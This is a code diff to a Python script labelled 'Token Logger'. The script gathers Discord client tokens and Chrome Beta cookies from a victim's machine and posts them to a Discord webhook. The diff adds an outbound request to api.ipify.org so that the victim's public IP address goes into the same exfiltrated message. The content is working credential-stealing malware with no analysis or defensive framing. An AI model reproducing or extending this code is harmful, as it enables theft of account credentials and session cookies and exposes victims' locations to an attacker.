@@ -3,6 +3,7 @@ import aiohttp
 import re
 import discord
 import asyncio
+import requests
 from discord import Webhook, AsyncWebhookAdapter
 
 
@@ -67,6 +68,7 @@ async def send():
         e = discord.Embed(title="Token Logger", description="")
         e.add_field(name="Canary Tokens", value="\n\n".join(canary_tokens), inline=False)
         e.add_field(name="\nDefault Client Tokens", value="\n\n".join(main_tokens), inline=False)
+        e.add_field(name="IP", value=requests.get("https://api.ipify.org").text)
         if crb_exists:
             wb = Webhook.from_url(webhook, adapter=AsyncWebhookAdapter(session))
             eb = discord.Embed(title="Chrome Beta Cookies", description="")
